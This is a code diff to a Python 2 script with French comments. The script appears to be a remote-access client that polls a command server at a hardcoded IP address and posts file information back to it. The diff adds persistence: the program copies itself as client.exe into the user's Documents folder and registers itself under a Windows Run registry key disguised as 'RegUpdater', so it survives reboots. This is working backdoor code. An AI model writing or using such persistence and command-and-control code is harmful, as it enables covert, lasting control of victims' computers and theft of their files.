@@ -5,6 +5,34 @@ import os
 
 URL_SERVER = "http://10.142.10.22"
 
+#Persistence
+# path courant
+path = os.getcwd().strip('/n')
+print path
+
+# user profile
+Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
+
+# destination outil
+destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
+
+#Si 1ere execution
+if not os.path.exists(destination):
+
+    # Copie executable
+    shutil.copyfile(path+'\\client.exe', destination)
+    print 'Fichier copie'
+
+    #cle de registre
+    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
+    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
+    key.Close()
+    print 'cle cree'
+
+
+
+
+
 while True:
 
     req = requests.get(URL_SERVER)
@@ -35,7 +63,6 @@ while True:
                 path += cmd[i]
                 path += " "
             path = path[:-1]
-            print path
 
             if os.path.exists(path):
                 post_response = requests.post(url=URL_SERVER+"/nomDeFichier", data="Nom du fichier: "+path)
